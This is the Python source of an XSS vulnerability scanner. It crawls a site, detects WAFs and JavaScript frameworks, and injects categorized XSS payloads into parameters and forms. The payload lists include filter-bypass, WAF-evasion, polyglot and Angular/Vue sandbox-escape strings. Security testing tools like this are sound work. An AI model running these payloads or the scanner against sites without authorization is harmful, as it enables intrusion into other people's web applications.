"""Enhanced XSS (Cross-Site Scripting) Scanner Module with Advanced Detection Capabilities and Web Crawling."""

import asyncio
import httpx
import re
import json
import base64
import hashlib
import time
from typing import Dict, List, Any, Optional, Set, Tuple
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, quote, urljoin, urlunparse
from html import escape, unescape
from collections import defaultdict, deque
import requests
from bs4 import BeautifulSoup

from ..base_module import (
    BaseScannerModule,
    ScanConfig,
    ScanResult,
    Vulnerability,
    SeverityLevel,
    ScanType
)

# Selenium/Playwright imports (with fallback)
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False


class XSSScanner(BaseScannerModule):
    """Enhanced Cross-Site Scripting (XSS) vulnerability scanner with web crawling and advanced detection."""
    
    def __init__(self):
        super().__init__()
        self.name = "XSSScanner"
        self.description = "Detects Cross-Site Scripting (XSS) vulnerabilities with web crawling, advanced DOM and stored XSS detection"
        self.scan_type = ScanType.ACTIVE
        self.debug_mode = False
        
        # Crawler state
        self.visited_urls: Set[str] = set()
        self.discovered_urls: Set[str] = set()
        self.urls_with_params: Set[str] = set()
        self.forms: List[Dict[str, Any]] = []
        
        # Store submitted payloads for stored XSS verification
        self.stored_xss_markers = {}
        self.stored_xss_submissions = []
        
        # XSS payloads categorized by type
        self.xss_payloads = {
            'basic': [
                '<script>alert(1)</script>',
                '<script>alert("XSS")</script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<img src=x onerror=alert(1)>',
                '<img src="x" onerror="alert(1)">',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<iframe src="javascript:alert(1)">',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
            ],
            
            'encoded': [
                '&lt;script&gt;alert(1)&lt;/script&gt;',
                '&#60;script&#62;alert(1)&#60;/script&#62;',
                '%3Cscript%3Ealert(1)%3C/script%3E',
                '%3Cimg%20src=x%20onerror=alert(1)%3E',
                '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
                '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
                '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E',
            ],
            
            'event_handlers': [
                '" onmouseover="alert(1)',
                "' onmouseover='alert(1)",
                '" onfocus="alert(1)" autofocus="',
                "' onfocus='alert(1)' autofocus='",
                '" onclick="alert(1)',
                "' onclick='alert(1)",
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
                '"><img src=x onerror=alert(1)>',
                "'><img src=x onerror=alert(1)>",
            ],
            
            'javascript_protocol': [
                'javascript:alert(1)',
                'javascript:alert("XSS")',
                'javascript:void(alert(1))',
                'JaVaScRiPt:alert(1)',
                'javascript&#58;alert(1)',
                'javascript&#x3A;alert(1)',
            ],
            
            'dom_based': [
                '#<script>alert(1)</script>',
                '?name=<script>alert(1)</script>',
                '#"><img src=x onerror=alert(1)>',
                '?search="><script>alert(1)</script>',
                'javascript:alert(document.location)',
                'javascript:alert(document.cookie)',
            ],
            
            'filter_bypass': [
                '<ScRiPt>alert(1)</ScRiPt>',
                '<script >alert(1)</script>',
                '<script\t>alert(1)</script>',
                '<script\n>alert(1)</script>',
                '<script\r>alert(1)</script>',
                "<script/**/>alert(1)</script>",
                '<script/src=data:,alert(1)>',
                '<IMG SRC=x onerror="alert(1)">',
                '<iMg SrC=x OnErRoR=alert(1)>',
            ],
            
            'waf_evasion': [
                '<sCrIpT>alert(1)</sCrIpT>',
                '<img/src=x/onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '<iframe/src="javascript:alert(1)">',
                '<script>alert(1)%0d%0a</script>',
                '<img src=x onerror=alert`1`>',
                '<svg><animate onbegin=alert(1)>',
                '<img src=x onerror=alert&#40;1&#41;>',
                '<script>alert(String.fromCharCode(49))</script>',
                '<img src=x:x onerror=alert(1)>',
            ],
            
            'polyglot': [
                '">\'><img src=x onerror=alert(1)>',
                '"><script>alert(String.fromCharCode(88,83,83))</script>',
                '\'-alert(1)-\'',
                '";alert(1);//',
                '</script><script>alert(1)</script>',
            ],
            
            'stored_xss_test': [
                '<script>alert("STORED_XSS_TEST_{marker}")</script>',
                '<img src=x onerror="console.log(\'STORED_XSS_{marker}\')">',
                '<svg onload="alert(\'STORED_XSS_{marker}\')">',
                '"><script>alert("STORED_{marker}")</script>',
                '<script>document.write("XSS_{marker}")</script>',
            ],
            
            'framework_specific': {
                'react': [
                    'javascript:alert(1)',
                    '<img src=x onerror=alert(1)>',
                    '{alert(1)}',
                    '${alert(1)}',
                ],
                'angular': [
                    '{{constructor.constructor("alert(1)")()}}',
                    '{{$on.constructor("alert(1)")()}}',
                    '<img src=x ng-focus=$event.view.alert(1)>',
                ],
                'vue': [
                    '{{_c.constructor("alert(1)")()}}',
                    '<img src=x @error="alert(1)">',
                    'v-on:click="alert(1)"',
                ],
            },
            
            'dom_clobbering': [
                '<form name="document"><input name="cookie"></form>',
                '<img name="location" src="x">',
                '<a id="getElementById"></a>',
                '<form id="test"><input name="action"></form>',
            ]
        }
        
        # XSS indicators
        self.xss_indicators = [
            r'<script[^>]*>.*?alert\([^)]*\).*?</script>',
            r'onerror\s*=\s*["\']?alert\(',
            r'onload\s*=\s*["\']?alert\(',
            r'onclick\s*=\s*["\']?alert\(',
            r'javascript:\s*alert\(',
            r'<img[^>]*onerror[^>]*>',
            r'<svg[^>]*onload[^>]*>',
        ]
        
        # Context detection patterns
        self.context_patterns = {
            'html_tag': r'<[^>]*{payload}[^>]*>',
            'html_attribute': r'[a-zA-Z]+\s*=\s*["\']?{payload}',
            'javascript': r'<script[^>]*>[^<]*{payload}[^<]*</script>',
            'url': r'(href|src|action)\s*=\s*["\']?[^"\']*{payload}',
            'css': r'<style[^>]*>[^<]*{payload}[^<]*</style>',
            'json': r'\{[^}]*["\']:\s*["\'][^"\']*{payload}',
        }
        
        # WAF detection patterns
        self.waf_indicators = {
            'cloudflare': ['cloudflare', 'cf-ray', 'cf-request-id'],
            'akamai': ['akamai', 'akamai-origin-hop'],
            'imperva': ['incapsula', 'imperva', 'visid_incap'],
            'aws': ['awselb', 'x-amzn-requestid', 'x-amz-cf-id'],
            'sucuri': ['sucuri', 'x-sucuri-id'],
            'wordfence': ['wordfence'],
            'modsecurity': ['mod_security', 'naxsi'],
            'generic': ['blocked', 'forbidden', 'not acceptable', 'security policy']
        }
        
        # DOM sources and sinks
        self.dom_sources = [
            'location.hash', 'location.search', 'location.href',
            'document.URL', 'document.documentURI', 'document.referrer',
            'window.name', 'document.cookie'
        ]
        
        self.dom_sinks = [
            'eval', 'setTimeout', 'setInterval', 'Function',
            'document.write', 'document.writeln', 'innerHTML',
            'outerHTML', 'insertAdjacentHTML'
        ]
        
        # JavaScript framework detection patterns
        self.framework_patterns = {
            'react': [r'react', r'__REACT', r'_reactRoot'],
            'angular': [r'angular', r'ng-app', r'ng-controller'],
            'vue': [r'vue', r'v-if', r'v-for'],
            'jquery': [r'jquery', r'\$\(', r'jQuery'],
        }
    
    def validate_target(self, target: str) -> bool:
        """Validate if target is suitable for XSS testing."""
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        try:
            parsed = urlparse(target)
            return bool(parsed.scheme and parsed.netloc)
        except:
            return False
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL to avoid duplicates."""
        parsed = urlparse(url)
        
        # Remove default ports
        netloc = parsed.netloc
        if ':80' in netloc and parsed.scheme == 'http':
            netloc = netloc.replace(':80', '')
        elif ':443' in netloc and parsed.scheme == 'https':
            netloc = netloc.replace(':443', '')
        
        # Normalize path (remove trailing slash for non-root)
        path = parsed.path.rstrip('/') if parsed.path != '/' else '/'
        
        # Sort query parameters
        if parsed.query:
            params = sorted(parse_qs(parsed.query).items())
            query = '&'.join([f"{k}={v[0]}" for k, v in params])
        else:
            query = ''
        
        # Rebuild URL
        normalized = f"{parsed.scheme}://{netloc}{path}"
        if query:
            normalized += f"?{query}"
        
        return normalized
    
    def _extract_form_data(self, form, page_url: str) -> Dict[str, Any]:
        """Extract data from an HTML form."""
        form_action = form.get('action', '')
        form_method = form.get('method', 'get').upper()
        
        # Resolve relative URLs
        if form_action:
            form_action = urljoin(page_url, form_action)
        else:
            form_action = page_url
        
        # Extract all input fields
        inputs = []
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_data = {
                'name': input_tag.get('name', ''),
                'type': input_tag.get('type', 'text'),
                'value': input_tag.get('value', '')
            }
            if input_data['name']:  # Only add if it has a name
                inputs.append(input_data)
        
        return {
            'url': form_action,
            'method': form_method,
            'inputs': inputs,
            'found_on_page': page_url
        }
    
    async def _crawl_website(self, start_url: str, max_depth: int = 2, max_urls: int = 30) -> Dict[str, Any]:
        """
        Crawl website to discover URLs and forms for XSS testing.
        
        Args:
            start_url: Starting URL to crawl
            max_depth: Maximum depth to crawl
            max_urls: Maximum number of URLs to discover
            
        Returns:
            Dictionary containing discovered URLs and forms
        """
        if self.debug_mode:
            print(f"[DEBUG] Starting web crawl from: {start_url}")
            print(f"[DEBUG] Max depth: {max_depth}, Max URLs: {max_urls}")
        
        # Reset crawler state
        self.visited_urls.clear()
        self.discovered_urls.clear()
        self.urls_with_params.clear()
        self.forms.clear()
        
        parsed_start = urlparse(start_url)
        base_domain = parsed_start.netloc
        
        # Queue structure: (url, depth)
        queue = deque([(start_url, 0)])
        self.discovered_urls.add(self._normalize_url(start_url))
        
        crawl_stats = {
            'pages_crawled': 0,
            'urls_discovered': 0,
            'forms_found': 0,
            'urls_with_parameters': 0,
            'errors': []
        }
        
        while queue and len(self.visited_urls) < max_urls:
            current_url, depth = queue.popleft()
            normalized_url = self._normalize_url(current_url)
            
            # Skip if already visited or depth exceeded
            if normalized_url in self.visited_urls or depth > max_depth:
                continue
            
            if self.debug_mode:
                print(f"[DEBUG] Crawling [{depth}/{max_depth}]: {current_url}")
            
            try:
                # Mark as visited
                self.visited_urls.add(normalized_url)
                crawl_stats['pages_crawled'] += 1
                
                # Fetch the page
                response = requests.get(
                    current_url,
                    headers={'User-Agent': 'SENTINEL-XSS-Scanner/1.0'},
                    timeout=10,
                    allow_redirects=True,
                    verify=False
                )
                
                # Only process HTML content
                content_type = response.headers.get('Content-Type', '')
                if 'text/html' not in content_type.lower():
                    continue
                
                # Parse HTML
                soup = BeautifulSoup(response.content, 'html.parser')
                
                # Extract all links
                for link in soup.find_all('a', href=True):
                    href = link.get('href')
                    absolute_url = urljoin(current_url, href)
                    
                    # Parse and validate URL
                    parsed_url = urlparse(absolute_url)
                    
                    # Only crawl URLs from the same domain
                    if parsed_url.netloc != base_domain:
                        continue
                    
                    # Skip non-HTTP(S) schemes
                    if parsed_url.scheme not in ['http', 'https']:
                        continue
                    
                    # Normalize URL
                    clean_url = self._normalize_url(absolute_url)
                    
                    # Check if URL has parameters (potential injection points)
                    if parsed_url.query:
                        self.urls_with_params.add(clean_url)
                        crawl_stats['urls_with_parameters'] += 1
                    
                    # Add to discovered URLs and queue
                    if clean_url not in self.discovered_urls:
                        self.discovered_urls.add(clean_url)
                        crawl_stats['urls_discovered'] += 1
                        
                        # Add to queue if we haven't reached max depth
                        if depth < max_depth and len(self.visited_urls) < max_urls:
                            queue.append((clean_url, depth + 1))
                
                # Extract forms (important for testing injection vulnerabilities)
                forms = soup.find_all('form')
                for form in forms:
                    form_data = self._extract_form_data(form, current_url)
                    if form_data:
                        self.forms.append(form_data)
                        crawl_stats['forms_found'] += 1
                
                # Small delay to be respectful
                await asyncio.sleep(0.1)
                
            except requests.exceptions.RequestException as e:
                crawl_stats['errors'].append(f"Error crawling {current_url}: {str(e)}")
                if self.debug_mode:
                    print(f"[DEBUG] Error crawling {current_url}: {str(e)}")
            except Exception as e:
                crawl_stats['errors'].append(f"Unexpected error at {current_url}: {str(e)}")
                if self.debug_mode:
                    print(f"[DEBUG] Unexpected error at {current_url}: {str(e)}")
        
        if self.debug_mode:
            print(f"[DEBUG] Crawling complete!")
            print(f"[DEBUG] Pages crawled: {crawl_stats['pages_crawled']}")
            print(f"[DEBUG] Total URLs discovered: {len(self.discovered_urls)}")
            print(f"[DEBUG] URLs with parameters: {len(self.urls_with_params)}")
            print(f"[DEBUG] Forms found: {len(self.forms)}")
        
        return {
            'discovered_urls': list(self.discovered_urls),
            'urls_with_parameters': list(self.urls_with_params),
            'forms': self.forms,
            'statistics': crawl_stats
        }
    
    async def scan(self, config: ScanConfig) -> ScanResult:
        """Perform comprehensive XSS vulnerability scan with web crawling."""
        self.debug_mode = config.debug
        
        if self.debug_mode:
            print(f"[DEBUG] XSSScanner starting for target: {config.target}")
        
        started_at = datetime.utcnow()
        vulnerabilities = []
        errors = []
        warnings = []
        info = {
            'crawl_enabled': False,
            'urls_discovered': 0,
            'urls_tested': 0,
            'forms_tested': 0,
            'tested_parameters': [],
            'vulnerable_parameters': [],
            'xss_types_found': [],
            'waf_detected': False,
            'frameworks_detected': []
        }
        statistics = {
            'urls_tested': 0,
            'parameters_tested': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0,
            'pages_crawled': 0
        }
        
        try:
            target_url = config.target
            if not target_url.startswith(('http://', 'https://')):
                target_url = f"https://{target_url}"
            
            # Detect WAF
            waf_info = await self._detect_waf_advanced(target_url)
            info['waf_detected'] = waf_info['detected']
            
            # Detect frameworks
            frameworks = await self._detect_frameworks(target_url)
            info['frameworks_detected'] = frameworks
            
            if config.scan_type == ScanType.PASSIVE:
                # Passive checks only on the single URL
                passive_vulns = await self._passive_xss_check(target_url)
                vulnerabilities.extend(passive_vulns)
                statistics['urls_tested'] = 1
            else:
                # Active testing with optional crawling
                urls_to_test = [target_url]
                forms_to_test = []
                
                # Determine if we should crawl based on scan type
                should_crawl = config.scan_type in [ScanType.ACTIVE, ScanType.AGGRESSIVE]
                max_crawl_depth = 3 if config.scan_type == ScanType.AGGRESSIVE else 2
                max_crawl_urls = 50 if config.scan_type == ScanType.AGGRESSIVE else 30
                
                if should_crawl:
                    info['crawl_enabled'] = True
                    print(f"[*] Web crawling enabled. Discovering pages...")
                    
                    # Crawl the website to discover URLs and forms
                    crawl_result = await self._crawl_website(
                        target_url, 
                        max_depth=max_crawl_depth,
                        max_urls=max_crawl_urls
                    )
                    
                    # Prioritize URLs with parameters for testing
                    if crawl_result['urls_with_parameters']:
                        urls_to_test = crawl_result['urls_with_parameters']
                    else:
                        # If no URLs with params found, test all discovered URLs (limited)
                        urls_to_test = crawl_result['discovered_urls'][:20]
                    
                    forms_to_test = crawl_result['forms']
                    
                    info['urls_discovered'] = len(crawl_result['discovered_urls'])
                    statistics['pages_crawled'] = crawl_result['statistics']['pages_crawled']
                    
                    print(f"[+] Discovered {len(crawl_result['discovered_urls'])} URLs")
                    print(f"[+] Found {len(crawl_result['urls_with_parameters'])} URLs with parameters")
                    print(f"[+] Found {len(forms_to_test)} forms")
                
                # Test each discovered URL for XSS
                print(f"[*] Testing {len(urls_to_test)} URLs for XSS vulnerabilities...")
                for test_url in urls_to_test:
                    if self.debug_mode:
                        print(f"[DEBUG] Testing URL: {test_url}")
                    
                    reflected_results = await self._test_reflected_xss_enhanced(
                        test_url, config, waf_info, frameworks
                    )
                    vulnerabilities.extend(reflected_results['vulnerabilities'])
                    statistics['payloads_tested'] += reflected_results['payloads_tested']
                    statistics['urls_tested'] += 1
                    
                    # Add tested parameters to info
                    for param in reflected_results['tested_params']:
                        if param not in info['tested_parameters']:
                            info['tested_parameters'].append(param)
                
                # Test forms for XSS
                if forms_to_test:
                    print(f"[*] Testing {len(forms_to_test)} forms for XSS vulnerabilities...")
                    for form in forms_to_test:
                        if self.debug_mode:
                            print(f"[DEBUG] Testing form at: {form['url']}")
                        
                        form_results = await self._test_form_xss(form, config, waf_info)
                        vulnerabilities.extend(form_results['vulnerabilities'])
                        statistics['payloads_tested'] += form_results['payloads_tested']
                        info['forms_tested'] += 1
                
                info['urls_tested'] = statistics['urls_tested']
            
            # Update statistics
            statistics['vulnerabilities_found'] = len(vulnerabilities)
            statistics['parameters_tested'] = len(info['tested_parameters'])
            
            # Extract vulnerable parameters and XSS types
            for vuln in vulnerabilities:
                if vuln.evidence and 'parameter' in vuln.evidence:
                    param = vuln.evidence['parameter']
                    if param not in info['vulnerable_parameters']:
                        info['vulnerable_parameters'].append(param)
                
                # Determine XSS type
                if 'reflected' in vuln.name.lower():
                    if 'Reflected XSS' not in info['xss_types_found']:
                        info['xss_types_found'].append('Reflected XSS')
                elif 'dom' in vuln.name.lower():
                    if 'DOM XSS' not in info['xss_types_found']:
                        info['xss_types_found'].append('DOM XSS')
                elif 'stored' in vuln.name.lower():
                    if 'Stored XSS' not in info['xss_types_found']:
                        info['xss_types_found'].append('Stored XSS')
            
            print(f"[+] XSS scan complete. Found {len(vulnerabilities)} vulnerabilities")
            
        except Exception as e:
            errors.append(f"XSS scan failed: {str(e)}")
            if self.debug_mode:
                import traceback
                print(f"[DEBUG] Error: {traceback.format_exc()}")
        
        completed_at = datetime.utcnow()
        
        return ScanResult(
            module_name=self.name,
            success=len(errors) == 0,
            started_at=started_at,
            completed_at=completed_at,
            vulnerabilities=vulnerabilities,
            errors=errors,
            warnings=warnings,
            info=info,
            statistics=statistics
        )
    
    async def _test_form_xss(self, form: Dict[str, Any], config: ScanConfig, 
                             waf_info: Dict) -> Dict[str, Any]:
        """Test a form for XSS vulnerabilities."""
        vulnerabilities = []
        payloads_tested = 0
        
        # Select payloads based on WAF
        if waf_info['detected']:
            base_payloads = self.xss_payloads['waf_evasion'][:3]
        else:
            base_payloads = self.xss_payloads['basic'][:3]
        
        form_url = form['url']
        form_method = form['method']
        form_inputs = form['inputs']
        
        if not form_inputs:
            return {'vulnerabilities': [], 'payloads_tested': 0}
        
        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15.0) as client:
            for input_field in form_inputs:
                if input_field['type'] in ['submit', 'button', 'hidden']:
                    continue
                
                field_name = input_field['name']
                
                for payload in base_payloads:
                    payloads_tested += 1
                    
                    # Create unique marker
                    marker = hashlib.md5(f"{field_name}{payload}{time.time()}".encode()).hexdigest()[:12]
                    marked_payload = payload.replace('alert(1)', f'alert("{marker}")')
                    
                    # Prepare form data with payload
                    form_data = {}
                    for inp in form_inputs:
                        if inp['name'] == field_name:
                            form_data[inp['name']] = marked_payload
                        else:
                            form_data[inp['name']] = inp['value'] or 'test'
                    
                    if self.debug_mode:
                        print(f"[DEBUG] Testing form field '{field_name}' with payload: {marked_payload[:50]}")
                    
                    try:
                        if form_method.upper() == 'POST':
                            response = await client.post(form_url, data=form_data)
                        else:
                            response = await client.get(form_url, params=form_data)
                        
                        # Check for reflection
                        if marked_payload in response.text or marker in response.text:
                            context = self._determine_context_enhanced(marked_payload, response.text)
                            
                            vuln = Vulnerability(
                                module=self.name,
                                name=f"Reflected XSS in form field '{field_name}'",
                                description=f"Form field '{field_name}' at {form_url} is vulnerable to reflected XSS in {context} context.",
                                severity=SeverityLevel.HIGH,
                                confidence=0.9,
                                affected_urls=[form_url],
                                evidence={
                                    'form_url': form_url,
                                    'field': field_name,
                                    'method': form_method,
                                    'payload': payload,
                                    'context': context,
                                    'marker': marker
                                },
                                remediation="Implement proper output encoding for user input in forms.",
                                references=["https://owasp.org/www-community/attacks/xss/"],
                                cwe_ids=["CWE-79"]
                            )
                            
                            vulnerabilities.append(vuln)
                            break
                    except Exception as e:
                        if self.debug_mode:
                            print(f"[DEBUG] Error testing form: {e}")
        
        return {
            'vulnerabilities': vulnerabilities,
            'payloads_tested': payloads_tested
        }
    
    async def _detect_waf_advanced(self, url: str) -> Dict[str, Any]:
        """Advanced WAF detection."""
        waf_info = {'detected': False, 'type': 'Unknown', 'confidence': 0.0}
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                test_payloads = ['<script>alert(1)</script>', "' OR '1'='1"]
                
                for payload in test_payloads:
                    try:
                        response = await client.get(f"{url}?test={payload}")
                        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
                        
                        # Check headers for WAF signatures
                        for waf_name, indicators in self.waf_indicators.items():
                            if waf_name == 'generic':
                                continue
                            for indicator in indicators:
                                if any(indicator in v for v in headers_lower.values()):
                                    waf_info['detected'] = True
                                    waf_info['type'] = waf_name.capitalize()
                                    waf_info['confidence'] = 0.9
                                    return waf_info
                        
                        # Check response body
                        response_text = response.text.lower()
                        for indicator in self.waf_indicators['generic']:
                            if indicator in response_text:
                                waf_info['detected'] = True
                                waf_info['type'] = 'Generic WAF'
                                waf_info['confidence'] = 0.7
                        
                        # Check status codes
                        if response.status_code in [403, 406, 419, 429, 503]:
                            waf_info['detected'] = True
                            if waf_info['type'] == 'Unknown':
                                waf_info['type'] = 'Generic WAF'
                    except:
                        pass
        except:
            pass
        
        return waf_info
    
    async def _detect_frameworks(self, url: str) -> List[str]:
        """Detect JavaScript frameworks."""
        frameworks = []
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                response = await client.get(url)
                content = response.text.lower()
                
                for framework, patterns in self.framework_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            if framework not in frameworks:
                                frameworks.append(framework)
                            break
        except:
            pass
        
        return frameworks
    
    async def _test_reflected_xss_enhanced(
        self, url: str, config: ScanConfig, waf_info: Dict, frameworks: List[str]
    ) -> Dict[str, Any]:
        """Enhanced reflected XSS testing."""
        vulnerabilities = []
        tested_params = []
        payloads_tested = 0
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            params = {'q': ['test'], 'search': ['test'], 'name': ['test']}
        
        # Select payloads based on WAF
        if waf_info['detected']:
            base_payloads = self.xss_payloads['waf_evasion'][:5]
        else:
            base_payloads = self.xss_payloads['basic'][:5]
        
        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15.0) as client:
            for param_name, param_values in params.items():
                tested_params.append(param_name)
                
                for payload in base_payloads:
                    payloads_tested += 1
                    
                    # Create unique marker
                    marker = hashlib.md5(f"{param_name}{payload}{time.time()}".encode()).hexdigest()[:12]
                    marked_payload = payload.replace('alert(1)', f'alert("{marker}")')
                    
                    test_params = params.copy()
                    test_params[param_name] = [marked_payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                    
                    if self.debug_mode:
                        print(f"[DEBUG] Testing param '{param_name}' with payload: {marked_payload[:50]}")
                    
                    try:
                        response = await client.get(test_url)
                        
                        # Check for reflection
                        if marked_payload in response.text or marker in response.text:
                            context = self._determine_context_enhanced(marked_payload, response.text)
                            
                            vuln = Vulnerability(
                                module=self.name,
                                name=f"Reflected XSS in parameter '{param_name}'",
                                description=f"Parameter '{param_name}' is vulnerable to reflected XSS in {context} context.",
                                severity=SeverityLevel.HIGH,
                                confidence=0.9,
                                affected_urls=[url],
                                evidence={
                                    'parameter': param_name,
                                    'payload': payload,
                                    'context': context,
                                    'marker': marker
                                },
                                remediation="Implement proper output encoding for user input.",
                                references=["https://owasp.org/www-community/attacks/xss/"],
                                cwe_ids=["CWE-79"]
                            )
                            
                            vulnerabilities.append(vuln)
                            break
                    except Exception as e:
                        if self.debug_mode:
                            print(f"[DEBUG] Error testing payload: {e}")
        
        return {
            'vulnerabilities': vulnerabilities,
            'tested_params': tested_params,
            'payloads_tested': payloads_tested
        }
    
    async def _passive_xss_check(self, url: str) -> List[Vulnerability]:
        """Passive XSS checks."""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                response = await client.get(url)
                content = response.text.lower()
                
                # Check for unsafe inline scripts
                if '<script>' in content and 'document.write' in content:
                    vulnerabilities.append(
                        Vulnerability(
                            module=self.name,
                            name="Potential DOM XSS - Unsafe document.write",
                            description="Page uses document.write which could lead to DOM-based XSS",
                            severity=SeverityLevel.MEDIUM,
                            confidence=0.6,
                            affected_urls=[url],
                            remediation="Avoid using document.write. Use safe DOM manipulation methods.",
                            cwe_ids=["CWE-79"]
                        )
                    )
                
                # Check for missing CSP header
                if 'content-security-policy' not in response.headers:
                    vulnerabilities.append(
                        Vulnerability(
                            module=self.name,
                            name="Missing Content Security Policy",
                            description="No CSP header found - increases XSS risk",
                            severity=SeverityLevel.LOW,
                            confidence=1.0,
                            affected_urls=[url],
                            remediation="Implement Content Security Policy to mitigate XSS attacks.",
                            references=["https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"]
                        )
                    )
        except:
            pass
        
        return vulnerabilities
    
    def _determine_context_enhanced(self, payload: str, response_text: str) -> str:
        """Determine the context where payload is reflected."""
        escaped_payload = re.escape(payload)
        
        # Check script context
        if re.search(f'<script[^>]*>.*{escaped_payload}.*</script>', response_text, re.DOTALL | re.IGNORECASE):
            return 'javascript'
        
        # Check event handler
        if re.search(f'on\\w+=["\']?[^"\']*{escaped_payload}', response_text, re.IGNORECASE):
            return 'event_handler'
        
        # Check HTML tag
        if re.search(f'<[^>]*{escaped_payload}[^>]*>', response_text):
            return 'html_tag'
        
        # Check HTML attribute
        if re.search(f'[a-zA-Z]+\\s*=\\s*["\']?[^"\']*{escaped_payload}', response_text):
            return 'html_attribute'
        
        # Check URL context
        if re.search(f'(?:href|src|action)\\s*=\\s*["\']?[^"\']*{escaped_payload}', response_text, re.IGNORECASE):
            return 'url'
        
        return 'html_content'


# Example usage
async def main():
    """Example usage of the XSS Scanner."""
    scanner = XSSScanner()
    config = ScanConfig(
        target="http://testphp.vulnweb.com",
        scan_type=ScanType.ACTIVE,
        debug=True
    )
    
    print("Starting XSS scan...")
    result = await scanner.scan(config)
    
    print(f"\nScan completed: {'Success' if result.success else 'Failed'}")
    print(f"Vulnerabilities found: {len(result.vulnerabilities)}")
    
    for vuln in result.vulnerabilities:
        print(f"\n[{vuln.severity.value.upper()}] {vuln.name}")
        print(f"  Description: {vuln.description}")
        print(f"  Confidence: {vuln.confidence:.2%}")
        print(f"  Affected URL: {vuln.affected_urls[0] if vuln.affected_urls else 'N/A'}")
        if vuln.evidence:
            print(f"  Evidence: {vuln.evidence}")

if __name__ == "__main__":
    asyncio.run(main())